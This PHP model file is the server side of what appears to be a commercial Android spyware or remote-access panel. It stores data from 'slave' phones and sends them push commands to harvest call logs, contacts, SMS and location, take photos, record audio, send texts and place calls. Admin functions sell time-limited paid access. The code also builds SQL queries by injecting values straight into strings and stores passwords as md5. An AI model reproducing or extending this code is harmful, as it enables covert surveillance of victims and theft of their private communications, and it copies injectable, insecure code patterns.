<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Model extends CI_Model
{




public function login($user,$pass)
{

$where=array("username"=>$user,"password"=>$pass);
$query=$this->db->get_where("users",$where);

$no=$query->num_rows();
if($no==1){
	$query=$this->db->query("SELECT * FROM users WHERE username='$user' AND password='$pass' ");
	$res=$query->result();
	if($res[0]->active=='1')
		return 2;
	return 1;
}
else if($no==0){

	return 0;
}
}





public function getType($user)
{
$query=$this->db->query("SELECT * FROM users WHERE username='{$user}' ");
$res=$query->result();
return $res[0]->type;
}





// GCM
public function sendPush($slaveid,$type)
{

        $this->load->library('gcm');
        $this->gcm->setMessage('Test message ');
        $this->gcm->addRecepient($slaveid);
        $this->gcm->setData(array(
            'type' => $type
            // 'number'=> $number,
            // 'message'=> $message
        ));
        $this->gcm->setGroup(false);
		$bool=$this->gcm->send();


if($bool)
return true;
else
return false;

}
//
public function pushExtras($slaveid,$type,$number,$message)
{
        sleep(1);
        $this->load->library('gcm');
        // $this->gcm->setMessage('Test message ');
        $this->gcm->addRecepient($slaveid);
        $this->gcm->setData(array(
            'type' => $type,
            'number'=> $number,
            'message'=> $message
        ));
        $this->gcm->setTtl(60);
        $this->gcm->setGroup(false);
		$bool=$this->gcm->send();


if($bool)
return true;
else
return false;

}

// Get slaves
public function getSlaves()
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT * FROM users WHERE username='{$username}' ");
$res=$query->result();
$aid=$res[0]->aid;
$query=$this->db->query("SELECT * FROM slaves WHERE username='{$username}' ");
$slaves=$query->result();
return $slaves;
}

public function getDevice($device)
{
return $device;
}

public function getCalls($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT callstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->callstate;
$query=$this->db->query("SELECT calls FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$calls= json_decode($res[0]->calls,true);
return array(
    'calls' => $calls,
    'state' => "recieved",
    'device'=> $device

);
}
public function getContacts($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT contactstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->contactstate;
$query=$this->db->query("SELECT contacts FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$contacts= json_decode($res[0]->contacts,true);
return array(
    'contacts' => $contacts,
    'state' => $state,

);
}
public function getMessages($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT messages FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$messages= json_decode($res[0]->messages,true);
$query=$this->db->query("SELECT smsstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->smsstate;
return array(
    'messages' => $messages,
    'state' => $state,

);
}
public function getCamera($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT uniqueid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$uniqueid= $res[0]->uniqueid;
return array(
    'name' => $username,
    'rand' => $uniqueid,

);
}
public function getLocation($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT location FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$loc= $res[0]->location;
    $query=$this->db->query("SELECT locstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->locstate;
return array(
    'location' => $loc,
    'state' => $state,

);

}

// EXTRAS
public function status($device)
{
$username=$this->session->userdata('username');
$username="kevin";
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="status";
$message="status";
$number="status";
$this->pushExtras($slaveid,$type,$number,$message);
echo "sent";
}

public function sendSMS($device,$number,$message)
{
$username=$this->session->userdata('username');

$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="sendSMS";
$this->pushExtras($slaveid,$type,$number,$message);

}

public function makeCall($device,$number)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="makeCall";
$message="makeCall";
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo "Calling".$number."right now.";
}
else
{

}
}

public function flashLight($device,$message)
{
$username=$this->session->userdata('username');

$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="flashLight";
$message=$message;
$number="number";
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo "flashLight ".$message." executed";
}
else
{
echo "Error";

}
}

public function vibratePhone($device,$message)
{
$username=$this->session->userdata('username');

$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="vibrate";
$message=$message;
$number="number";
$this->pushExtras($slaveid,$type,$number,$message);
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo $type.$message." executed";
}
else
{
echo "Error";

}
}

public function alarm($device,$message)
{
$username=$this->session->userdata('username');

$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="alarm";
$message=$message;
$number="number";
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo $type.$message." executed";
}
else
{
echo "Error";

}
}

public function takePhoto($device,$message)
{
$username=$this->session->userdata('username');

$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="takePhoto";
$message=$message;
$number="number";
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo $type.$message." executed";
}
else
{
echo "Error";

}
}
public function captureAudio($device,$message)
{
$username=$this->session->userdata('username');

$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="captureAudio";
if($message>=300)
{
$message=300000;
$number="number";
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo "Audio capture Started for".$message."seconds";
}
else
{
echo "Error";

}
}
else {
$seconds=$message;
$message=$message*1000;
$number="number";
$state=$this->pushExtras($slaveid,$type,$number,$message);
if($state)
{
echo "Audio capture Started for ".$seconds." seconds";
}
else
{
echo "Error";

}
}
}



public function extras($device)
{
return $device;

}




// REFRESH LIST //
public function refreshCalls($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT callstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->callstate;

if ($state=="recieved")
{
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="getcalllogs";
$message="call";
$number="call";
$state = "sent";
//update state
$data = array('callstate' => $state,);
$this->db->where('slaveid', $slaveid);
$this->db->update('slaves', $data);
$this->pushExtras($slaveid,$type,$message,$number);
sleep(10);
//
//RETURN DATA
$query=$this->db->query("SELECT calls FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$calls = json_decode($res[0]->calls,true);
$query=$this->db->query("SELECT callstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->callstate;
    return array(
    'calls' => $calls,
    'state' => $state
);
}
}
public function refreshContacts($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT contactstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->contactstate;
if ($state=="recieved")
{
	$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
	$res=$query->result();
	$slaveid=$res[0]->slaveid;
	$type="getcontacts";
	$message="contacts";
	$number="contacts";
	$state = "sent";
	//update state
	$data = array('contactstate' => $state,);
	$this->db->where('slaveid', $slaveid);
	$this->db->update('slaves', $data);
	$this->pushExtras($slaveid,$type,$message,$number);
	sleep(10);


//RETURN DATA
$query=$this->db->query("SELECT contacts FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$contacts = json_decode($res[0]->contacts,true);
$query=$this->db->query("SELECT contactstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->contactstate;
    return array(
    'contacts' => $contacts,
    'state' => $state

    );

}
        }
public function refreshMessages($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT smsstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->smsstate;
if ($state=="recieved")
{
	$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
	$res=$query->result();
	$slaveid=$res[0]->slaveid;
	$type="getmessages";
	$message="contacts";
	$number="contacts";
	$this->pushExtras($slaveid,$type,$message,$number);
	$state = "sent";
	$data = array('smsstate' => $state,);
	$this->db->where('slaveid', $slaveid);
	$this->db->update('slaves', $data);
	sleep(10);
//update state

sleep(10);

//RETURN DATA
$query=$this->db->query("SELECT messages FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$messages = json_decode($res[0]->messages,true);
$query=$this->db->query("SELECT smsstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->smsstate;
    return array(
    'messages' => $messages,
    'state' => $state

    );
}

}
public function refreshLocation($device)
{
$username=$this->session->userdata('username');
$query=$this->db->query("SELECT locstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->locstate;
if ($state=="recieved")
{
	$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
	$res=$query->result();
	$slaveid=$res[0]->slaveid;
	$type="getlocation";
	$message="contacts";
	$number="contacts";
	$state = "sent";
	//update state
	$data = array('locstate' => $state,);
	$this->db->where('slaveid', $slaveid);
	$this->db->update('slaves', $data);
	$this->pushExtras($slaveid,$type,$message,$number);
	sleep(10);

sleep(10);
    //RETURN DATA
$query=$this->db->query("SELECT location FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$location= $res[0]->location;
$query=$this->db->query("SELECT locstate FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$state=$res[0]->locstate;
    return array(
    'location' => $location,
    'state' => $state

    );
}

}



public function forceLogout()
{

	$uname=$this->session->userdata('username');
	$query=$this->db->query("SELECT * FROM users WHERE username='{$uname}' ");
	$res=$query->result();
	$active=$res[0]->active;
	if($active==0) // Fuzzy
	{
		$this->session->sess_destroy();
		redirect("home/login");
	}

	$doe= $res[0]->doe;
	$left=$this->left($doe);
	if($left<=0)
	{
			$where=array('username'=>$this->session->userdata('username'));

			$this->db->where($where);

			$data=array('active'=>0,'doj'=>0,'doe'=>0);

			$bool=$this->db->update('users',$data);
			$this->session->sess_destroy();
		redirect("home/login");
	}

	return $left;


}


public function left($doe)
{
	$t= date("Y-m-d");

	$t=strtotime($t);
	$doe=strtotime($doe);
	return floor(($doe-$t)/(24*3600));

}
// Functions for API



public function addDetail($type,$detail,$username,$slaveid,$imei,$phonenumber,$device)
{


switch ($type) {

    case 'registration':
$uniqueid = substr($slaveid, -5);
$data=array('username'=>$username,'slaveid'=>$slaveid,'imei'=>$imei,'number'=>$phonenumber,'device'=>$device,'uniqueid'=>$uniqueid);
$bool=$this->db->insert('slaves',$data);

//
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="call";
$this->sendPush($slaveid,$type);
//
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="contacts";
$this->sendPush($slaveid,$type);
//
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="messages";
$this->sendPush($slaveid,$type);
//
$query=$this->db->query("SELECT slaveid FROM slaves WHERE imei='$device' AND username='$username'");
$res=$query->result();
$slaveid=$res[0]->slaveid;
$type="location";
$this->sendPush($slaveid,$type);
echo "Success";

    case 'sms':

$where=array('slaveid'=>$slaveid);
$this->db->where($where);
$data=array('messages'=>$detail,'smsstate'=>'recieved');
$bool=$this->db->update('slaves',$data);

break;


	case 'calllogs':
$state="recieved";
$where=array('slaveid'=>$slaveid);
$this->db->where($where);
$data=array('calls'=>$detail,'callstate'=>$state);
$bool=$this->db->update('slaves',$data);


break;


	case 'contacts':


$state="recieved";
$where=array('slaveid'=>$slaveid);
$this->db->where($where);
$data=array('contacts'=>$detail,'contactstate'=>$state);
$bool=$this->db->update('slaves',$data);

break;

	case 'location':


$state = "recieved";
$where=array('slaveid'=>$slaveid);
$this->db->where($where);
$data=array('location'=>$detail,'locstate'=>$state);
$bool=$this->db->update('slaves',$data);
break;


default:
echo "error";
break;
}





}




//  Functions for Admin


public function getUsers()
{
$query=$this->db->query("SELECT * FROM users ");
$res=$query->result();
return $res;
}

public function addUser($uname,$pass,$paypal)
{
$data=array('username'=>$uname,"password"=>md5($pass),"paypal"=>$paypal);


$bool=$this->db->insert('users',$data);
if($bool)
return true;
else
return false;


}



public function activateUser($id,$days)
{

$where=array('id'=>$id);

$this->db->where($where);

$jdate=date("Y-m-d");
$days="+".$days." day";
$edate=strtotime($days,strtotime($jdate));
$edate=date("Y-m-d",$edate);

$data=array('active'=>1, 'doj'=>$jdate,'doe'=>$edate);

$bool=$this->db->update('users',$data);

if($bool)
return true;
else
return false;

}



}
